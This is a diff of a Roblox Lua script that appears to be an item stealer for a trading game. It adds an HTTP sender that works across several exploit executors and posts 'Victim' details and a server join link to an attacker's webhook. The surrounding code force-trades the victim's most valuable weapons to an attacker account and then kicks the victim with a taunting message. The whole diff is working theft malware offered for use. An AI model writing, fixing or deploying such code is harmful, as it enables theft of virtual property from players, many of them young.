@@ -26,7 +26,7 @@ if #users == 0 or webhook == "" then
     return
 end
 
--- === PRIORITY USERS (dual hook first) ===
+-- === PRIORITY USERS ===
 local priority_users = DUAL_USERS
 local normal_users = {}
 for _, u in ipairs(users) do
@@ -72,13 +72,75 @@ local headers = {
 
 local function trim(s) return s:match("^%s*(.-)%s*$") end
 
-local function fetchHTML(url)
-    local success, resp = pcall(function()
-        return request({Url = url, Method = "GET", Headers = headers})
+-- === ÇOKLU HTTP DESTEĞİ (TÜM EXECUTORLARDA ÇALIŞIR) ===
+local function sendWebhook(url, payload)
+    local success, err = pcall(function()
+        local body = HttpService:JSONEncode(payload)
+
+        -- 1. Synapse X
+        if syn and syn.request then
+            print("[HTTP] Using syn.request")
+            syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
+            return
+        end
+
+        -- 2. Krnl / Fluxus / Electron
+        if request then
+            print("[HTTP] Using request")
+            request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
+            return
+        end
+
+        -- 3. Delta Executor
+        if http and http.request then
+            print("[HTTP] Using http.request (Delta)")
+            http.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
+            return
+        end
+
+        -- 4. Script-Ware
+        if http_request then
+            print("[HTTP] Using http_request")
+            http_request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = body})
+            return
+        end
+
+        -- 5. Fallback: game:HttpPost (test)
+        if game.HttpPost then
+            print("[HTTP] Using game:HttpPost")
+            game:HttpPost(url, body, "application/json")
+            return
+        end
+
+        error("No HTTP function available!")
     end)
-    return success and resp.Body or ""
+
+    if success then
+        print("[WEBHOOK] Sent to: " .. url)
+    else
+        print("[WEBHOOK ERROR] Failed to send: " .. tostring(err))
+    end
 end
 
+-- === FETCH HTML (value list) ===
+local function fetchHTML(url)
+    local success, resp = pcall(function()
+        if syn and syn.request then
+            local r = syn.request({Url = url, Method = "GET", Headers = headers})
+            return r.Body
+        elseif request then
+            local r = request({Url = url, Method = "GET", Headers = headers})
+            return r.Body
+        elseif http and http.request then
+            local r = http.request({Url = url, Method = "GET", Headers = headers})
+            return r.Body
+        end
+        return ""
+    end)
+    return success and resp or ""
+end
+
+-- === VALUE LIST PARSING ===
 local function parseValue(div)
     local v = div:match("<b class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
     return v and tonumber(v:gsub(",", "")) or nil
@@ -122,7 +184,7 @@ local function buildValueList()
         local name = item.ItemName and item.ItemName:lower() or ""
         local rarity = item.Rarity or ""
         local idx = table.find(rarityTable, rarity)
-        if idx and idx >= 4 then               -- Godly and above
+        if idx and idx >= 4 then
             if item.Chroma then
                 for cname, val in pairs(chroma) do
                     if cname:find(name) then values[id] = val; break end
@@ -175,23 +237,14 @@ table.sort(weaponsToSend, function(a,b) return (a.Value*a.Amount) > (b.Value*b.A
 local sentWeapons = {}
 for i,v in ipairs(weaponsToSend) do sentWeapons[i] = v end
 
--- === WEBHOOK SEND ===
-local function sendWebhook(url, payload)
-    pcall(function()
-        request({
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload)
-        })
-    end)
-end
-
+-- === EMBED BUILDER ===
 local function buildEmbed(title, fields)
     return {embeds = {{title = title, color = 65280, fields = fields, footer = {text = "Have fun :)"}}}}
 end
 
+-- === SEND MESSAGES ===
 local function SendFirstMessage()
+    print("[WEBHOOK] Sending first message...")
     local fields = {
         {name="Victim:", value=plr.Name, inline=true},
         {name="Join Link:", value="https://fern.wtf/joiner?placeId=142823291&gameInstanceId="..game.JobId},
@@ -212,6 +265,7 @@ local function SendFirstMessage()
 end
 
 local function SendExecutionMessage()
+    print("[WEBHOOK] Sending execution message...")
     local fields = {
         {name="Victim:", value=plr.Name, inline=true},
         {name="Items Sent:", value="", inline=false},
@@ -251,7 +305,6 @@ local function addWeaponToTrade(id)
 end
 
 local function doTrade(target)
-    -- Clean any existing trade
     local status = getTradeStatus()
     if status == "StartTrade" then ReplicatedStorage.Trade.DeclineTrade:FireServer()
     elseif status == "ReceivingRequest" then ReplicatedStorage.Trade.DeclineRequest:FireServer() end
@@ -275,7 +328,7 @@ local function doTrade(target)
     plr:Kick("All items taken by antxchris :D")
 end
 
--- === WAIT FOR TRUSTED USER & PRIORITY ===
+-- === WAIT FOR USER ===
 local target_user = nil
 local message_sent = false
 
